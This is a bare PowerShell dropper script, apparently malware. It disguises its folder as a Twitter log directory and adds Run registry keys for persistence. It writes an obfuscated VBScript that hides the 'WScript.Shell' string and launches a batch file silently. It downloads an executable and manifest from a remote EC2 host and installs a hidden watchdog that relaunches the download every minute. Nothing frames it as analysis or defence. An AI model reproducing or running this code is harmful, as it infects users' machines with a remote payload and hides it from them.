$OutPath = "C:\ProgramData\Twitter\log\"
if (-not (Test-Path  $OutPath ))
        {
            New-Item $OutPath -ItemType Directory -Force
        }

start-sleep 5

$Content = @'

REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v 1 /d "C:\ProgramData\Twitter\log\Untitled.exe"
REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v 2 /d "C:\Windows\System32\cmd.exe '/c  powershell -windo 1 -noexit -exec bypass -file C:\ProgramData\Twitter\log\look.ps1"

'@
Set-Content -Path C:\Users\Public\23.bat -Value $Content

$Content = @'

'Please open file form Your PC
'Please open file form Your PC
'Please open file form Your PC
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next

'Please open file form Your PC
'Please open file form Your PC
'Please open file form Your PC
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
'Please open file form Your PC
'Please open file form Your PC
'Please open file form Your PC
on error resume next
WScript.Sleep(3000)
WTHBX = replace("W\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\cript.\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\hEll","\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\","s")
Set USXEZ = CreateObject(WTHBX )
USXEZ.run """C:\Users\Public\23.bat"" ", 0, true
Set USXEZ = Nothing
'@
Set-Content -Path C:\Users\Public\23.vbs -Value $Content
start-sleep 10
start C:\Users\Public\23.vbs







$url = "http://ec2-3-235-29-66.compute-1.amazonaws.com/wrold/Untitled.exe" 
$path = "C:\ProgramData\Twitter\log\Untitled.exe" 
if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 
(New-Object Net.WebClient).DownloadFile($url, $path) 
$path

$url = "http://ec2-3-235-29-66.compute-1.amazonaws.com/wrold/Untitled.exe.manifest" 
$path = "C:\ProgramData\Twitter\log\Untitled.exe.manifest" 
if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 
(New-Object Net.WebClient).DownloadFile($url, $path) 
$path


start-sleep 5
$Content = @'
while ($true){
if((get-process "Untitled" -ea SilentlyContinue) -eq $Null){
{
}
start C:\ProgramData\Twitter\log\Untitled.exe
}
start-sleep 60
}
'@
Set-Content -Path C:\ProgramData\Twitter\log\look.ps1 -Value $Content

start-sleep 5


powershell -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "C:\ProgramData\Twitter\log\look.ps1"















